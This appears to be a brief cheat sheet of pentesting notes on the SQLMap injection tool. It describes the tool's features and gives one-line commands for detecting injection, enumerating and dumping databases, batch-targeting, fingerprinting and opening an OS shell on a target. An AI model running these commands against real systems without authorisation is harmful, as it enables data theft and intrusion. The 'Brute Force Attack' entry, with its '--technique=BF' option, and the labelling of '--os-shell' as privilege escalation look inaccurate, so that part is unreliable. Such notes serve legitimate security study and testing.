# `SQLMap`

### Automatic SQL Injection Detection:
SQLMap automates the process of detecting and exploiting SQL injection vulnerabilities in web applications by analyzing the provided parameters and payloads.

### Support for Multiple Database Management Systems (DBMS):
SQLMap supports various database management systems such as MySQL, PostgreSQL, Microsoft SQL Server, Oracle, and others.

### Enumeration of Database Information:
SQLMap can enumerate and extract valuable information from the database, including database names, tables, columns, and users.

### Brute Force and Dictionary Attacks:
Similar to Hydra, SQLMap supports brute-force and dictionary attacks to guess database usernames and passwords.


#### Automatic SQL Injection Detection:
sqlmap -u <target-url>


#### Enumeration of Databases:
sqlmap -u <target-url> --dbs


#### Dumping Data from a Specific Database:
sqlmap -u <target-url> -D <database-name> --dump


#### Brute Force Attack:
sqlmap -u <target-url> --data "username=test&password=^" -p password --dbms=mysql --technique=BF


#### Batch Testing:
sqlmap -m targets.txt


#### Fingerprinting:
sqlmap -u <target-url> --banner


#### Privilege Escalation:
sqlmap -u <target-url> --os-shell
